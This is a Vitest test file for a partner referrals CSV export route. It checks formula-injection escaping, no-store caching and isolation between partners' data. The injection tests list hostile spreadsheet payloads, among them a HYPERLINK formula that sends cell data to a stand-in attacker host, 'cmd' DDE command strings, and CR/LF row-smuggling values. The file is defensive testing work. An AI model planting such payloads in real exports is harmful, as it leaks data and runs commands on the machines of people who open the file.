/**
 * P02 — the partner referrals CSV (GET /api/partner/export/referrals) is safe
 * to open in a spreadsheet, is never cached, and only ever carries the
 * caller's own partner's referrals.
 *
 * - Formula injection: a member-, employer- or partner-typed value starting
 *   with = + - @ TAB or CR is neutralized (leading ') by the shared
 *   lib/csv.ts csvEscape, so Excel/Sheets treat it as text.
 * - Cache-Control: no-store, as the admin exports already send.
 * - Cross-partner: the partner comes from the session only; a partnerId in
 *   the query string is ignored and the email lookup stays inside the
 *   caller's bundle and org.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { NextRequest } from 'next/server';

type FixtureMember = {
  id: string;
  fullName: string;
  email: string;
  organizationId: string;
  placement?: { employerName: string; jobTitle: string } | null;
  city?: string;
};

type PartnerCtx = {
  partnerId: string;
  partner: { organizationId: string; name: string; slug: string; logoUrl: string | null };
};

const h = vi.hoisted(() => ({
  user: { id: 'user-a' } as { id: string } | null,
  partners: {} as Record<string, PartnerCtx>,
  referrals: {} as Record<string, FixtureMember[]>,
  userFindMany: vi.fn(),
  partnerReferralFindMany: vi.fn(async () => [] as unknown[]),
}));

vi.mock('@/lib/db/withRequestGuc', () => ({ withApiGuc: (handler: unknown) => handler }));
vi.mock('@/lib/auth/server', () => ({ getUser: vi.fn(async () => h.user) }));
vi.mock('@/lib/auth/roles', () => ({
  getPartnerForUser: vi.fn(async (userId: string) => h.partners[userId] ?? null),
}));
vi.mock('@/lib/audit', () => ({ auditLog: vi.fn(async () => {}) }));
vi.mock('@/lib/audit/log', () => ({ logAuditEvent: vi.fn(async () => {}) }));
vi.mock('@/lib/db/prisma', () => ({
  prisma: {
    $transaction: (cb: (tx: unknown) => unknown) => cb({ user: { findMany: h.userFindMany } }),
    partnerReferral: { findMany: h.partnerReferralFindMany },
    memberEvent: { findMany: vi.fn(async () => []) },
  },
}));
vi.mock('@/lib/partner/referralBundle', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/partner/referralBundle')>();
  return {
    ...actual,
    // A fake bundle keyed by partnerId + org, so a route that trusted the
    // query string (or dropped the org) would return another partner's rows.
    loadPartnerReferralBundle: vi.fn(async (partnerId: string, orgId: string) => ({
      pipelineMembers: (h.referrals[partnerId] ?? [])
        .filter((m) => m.organizationId === orgId)
        .map((m) => ({
          member: {
            id: m.id,
            placementRecord: m.placement
              ? { ...m.placement, placedAt: new Date('2026-08-01T00:00:00Z'), startDateVerified: true, onboardingWindowEnd: null, retentionDecision: null }
              : null,
            profile: { city: m.city ?? 'Austin', state: 'TX', zip: '78701', employmentStatus: 'unemployed', educationLevel: 'high_school' },
          },
          referredAt: new Date('2026-07-01T00:00:00Z'),
          _fullName: m.fullName,
        })),
    })),
    toPartnerMembersListRows: vi.fn((rows: Array<{ member: { id: string }; _fullName: string }>) =>
      rows.map((r) => ({
        id: r.member.id,
        fullName: r._fullName,
        stageLabel: 'Enrolled',
        programTitle: 'IT Support',
        progress: 40,
        story: '40% through IT Support',
        referredAtLabel: '7/1/2026',
      })),
    ),
  };
});

import { GET } from '@/app/api/partner/export/referrals/route';
import { loadPartnerReferralBundle } from '@/lib/partner/referralBundle';

const HEADER_BASE = 'Member name,Email,Stage,Program,Progress pct,Story,Referred date';
const FORMULA_START = /^[=+\-@\t\r]/;

/** Minimal RFC 4180 parser: CRLF rows, "" escapes, CR/LF allowed inside quotes. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') { cell += '"'; i += 1; }
      else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"' && cell === '') quoted = true;
    else if (c === ',') { row.push(cell); cell = ''; }
    else if (c === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i += 1; }
    else cell += c;
  }
  if (cell !== '' || row.length > 0) { row.push(cell); rows.push(row); }
  return rows;
}

async function exportAs(userId: string | null, query = '') {
  h.user = userId ? { id: userId } : null;
  const res = await GET(new NextRequest(`http://localhost/api/partner/export/referrals${query}`));
  return res;
}

/** Data section: every line after the '#' branding block, parsed. */
async function dataRows(res: Response) {
  const text = await res.text();
  const body = text.split('\r\n');
  const firstData = body.findIndex((line) => !line.startsWith('#'));
  const rows = parseCsv(body.slice(firstData).join('\r\n'));
  return { text, headerLine: body[firstData], header: rows[0], rows: rows.slice(1) };
}

const PARTNER_A: PartnerCtx = { partnerId: 'partner-a', partner: { organizationId: 'org-1', name: 'Partner A', slug: 'partner-a', logoUrl: null } };
const PARTNER_B: PartnerCtx = { partnerId: 'partner-b', partner: { organizationId: 'org-1', name: 'Partner B', slug: 'partner-b', logoUrl: null } };

beforeEach(() => {
  vi.clearAllMocks();
  h.partners = { 'user-a': PARTNER_A, 'user-b': PARTNER_B };
  h.referrals = {
    'partner-a': [{ id: 'member-a1', fullName: 'Avery A', email: 'avery.a@example.test', organizationId: 'org-1' }],
    'partner-b': [{ id: 'member-b1', fullName: 'Blake B', email: 'blake.b@example.test', organizationId: 'org-1' }],
  };
  h.userFindMany.mockImplementation(async (args: { where: { id: { in: string[] }; organizationId: string } }) =>
    Object.values(h.referrals)
      .flat()
      .filter((m) => args.where.id.in.includes(m.id) && m.organizationId === args.where.organizationId)
      .map((m) => ({ id: m.id, email: m.email })),
  );
});

describe('partner CSV formula neutralization (P02)', () => {
  const PAYLOADS = [
    '=HYPERLINK("http://evil.example/?d="&B2,"Click")',
    '+1+cmd|\' /C calc\'!A0',
    '-2+3',
    '@SUM(1+1)',
    '\t=1+1',
    '\r=1+1',
  ];

  it.each(['', '?preset=outcomes', '?preset=demographics'])('no cell starts with = + - @ TAB or CR (query "%s")', async (query) => {
    h.referrals['partner-a'] = PAYLOADS.map((p, i) => ({
      id: `member-a${i}`,
      fullName: p,
      email: `m${i}@example.test`,
      organizationId: 'org-1',
      placement: { employerName: p, jobTitle: p },
      city: p,
    }));

    const res = await exportAs('user-a', query);
    expect(res.status).toBe(200);
    const { rows } = await dataRows(res);
    expect(rows).toHaveLength(PAYLOADS.length);
    rows.forEach((row, i) => {
      for (const cell of row) expect(cell, JSON.stringify(cell)).not.toMatch(FORMULA_START);
      // The value survives intact behind the text marker.
      expect(row[0]).toBe(`'${PAYLOADS[i]}`);
    });
  });

  it('keeps ordinary values unchanged', async () => {
    const res = await exportAs('user-a');
    const { rows } = await dataRows(res);
    expect(rows).toEqual([['Avery A', 'avery.a@example.test', 'Enrolled', 'IT Support', '40', '40% through IT Support', '7/1/2026']]);
  });

  it('a CR/LF in the partner name cannot start an unescaped data row', async () => {
    h.partners['user-a'] = { ...PARTNER_A, partner: { ...PARTNER_A.partner, name: 'Partner A\r\n=cmd|"/C calc"!A0,x', logoUrl: 'https://x.example/l.png\r\n@evil' } };
    const res = await exportAs('user-a');
    const { headerLine, rows } = await dataRows(res);
    expect(headerLine).toBe(HEADER_BASE);
    expect(rows).toHaveLength(1);
  });

  // The partner name is partner-typed (signup, onboarding profile). A comma
  // (or ';' where Excel's list separator is ';') in a '#' line starts a new
  // cell, so a formula after it would be live even though the line starts '#'.
  it.each([
    'Acme,=HYPERLINK("http://evil.example/","Click")',
    'Acme, +1+1',
    'Acme,"=1+1"',
    'Acme;@SUM(1+1)',
    'Acme,\t=1+1',
    'Acme,-2+3',
  ])('no branding-line cell after a separator starts a formula (partner name %j)', async (name) => {
    h.partners['user-a'] = { ...PARTNER_A, partner: { ...PARTNER_A.partner, name, logoUrl: `https://x.example/l.png?a=1,${name}` } };
    const res = await exportAs('user-a');
    const text = await res.text();
    const branding = text.split('\r\n').filter((line) => line.startsWith('#'));
    const partnerLine = branding.find((line) => line.startsWith('# Partner: '));
    expect(partnerLine).toBeDefined();
    for (const line of branding) {
      for (const cell of line.split(/[,;]/).slice(1)) {
        expect(cell, JSON.stringify(line)).not.toMatch(FORMULA_START);
        expect(cell.replace(/^[ "]+/, ''), JSON.stringify(line)).not.toMatch(FORMULA_START);
      }
    }
    // Ordinary text around the separator is kept.
    expect(partnerLine).toContain('Acme');
  });

  it('keeps an ordinary partner name with a comma unchanged', async () => {
    h.partners['user-a'] = { ...PARTNER_A, partner: { ...PARTNER_A.partner, name: 'Smith, Jones & Co' } };
    const text = await (await exportAs('user-a')).text();
    expect(text.split('\r\n')).toContain('# Partner: Smith, Jones & Co');
  });
});

describe('partner CSV caching (P02)', () => {
  it('sends Cache-Control: no-store', async () => {
    const res = await exportAs('user-a', '?preset=outcomes');
    expect(res.status).toBe(200);
    expect(res.headers.get('Cache-Control')).toBe('no-store');
    expect(res.headers.get('Content-Type')).toBe('text/csv; charset=utf-8');
  });
});

describe('partner CSV cross-partner denial (P02)', () => {
  it("partner A asking for partner B's id in the query still gets only partner A's referrals", async () => {
    const res = await exportAs('user-a', '?partnerId=partner-b&partner=partner-b&preset=outcomes');
    expect(res.status).toBe(200);
    expect(loadPartnerReferralBundle).toHaveBeenCalledTimes(1);
    expect(loadPartnerReferralBundle).toHaveBeenCalledWith('partner-a', 'org-1');
    const { text, rows } = await dataRows(res);
    expect(rows.map((r) => r[0])).toEqual(['Avery A']);
    expect(text).not.toContain('Blake B');
    expect(text).not.toContain('blake.b@example.test');
    expect(res.headers.get('Content-Disposition')).toContain('partner-a');
  });

  it("the email lookup is limited to the caller's bundle members and org", async () => {
    await exportAs('user-a');
    expect(h.userFindMany).toHaveBeenCalledTimes(1);
    const where = h.userFindMany.mock.calls[0][0].where;
    expect(where).toEqual({ id: { in: ['member-a1'] }, organizationId: 'org-1' });
  });

  it("partner B gets only partner B's referrals", async () => {
    const res = await exportAs('user-b', '?partnerId=partner-a');
    expect(loadPartnerReferralBundle).toHaveBeenCalledWith('partner-b', 'org-1');
    const { text, rows } = await dataRows(res);
    expect(rows.map((r) => r[0])).toEqual(['Blake B']);
    expect(text).not.toContain('Avery A');
  });

  it('401 without a session, with no bundle or email read', async () => {
    const res = await exportAs(null, '?partnerId=partner-a');
    expect(res.status).toBe(401);
    expect(loadPartnerReferralBundle).not.toHaveBeenCalled();
    expect(h.userFindMany).not.toHaveBeenCalled();
  });

  it('403 for a signed-in user who is not a partner, even naming a partner in the query', async () => {
    const res = await exportAs('member-user', '?partnerId=partner-a');
    expect(res.status).toBe(403);
    expect(loadPartnerReferralBundle).not.toHaveBeenCalled();
    expect(h.userFindMany).not.toHaveBeenCalled();
  });

  it('the real bundle query is scoped to the partner, the partner org and the member org', async () => {
    const actual = await vi.importActual<typeof import('@/lib/partner/referralBundle')>('@/lib/partner/referralBundle');
    await actual.loadPartnerReferralBundle('partner-a', 'org-1');
    expect(h.partnerReferralFindMany).toHaveBeenCalledTimes(1);
    const args = (h.partnerReferralFindMany.mock.calls[0] as unknown as [{ where: Record<string, unknown> }])[0];
    expect(args.where).toMatchObject({
      partnerId: 'partner-a',
      partner: { organizationId: 'org-1' },
      member: expect.objectContaining({ organizationId: 'org-1', deletedAt: null }),
    });
  });
});
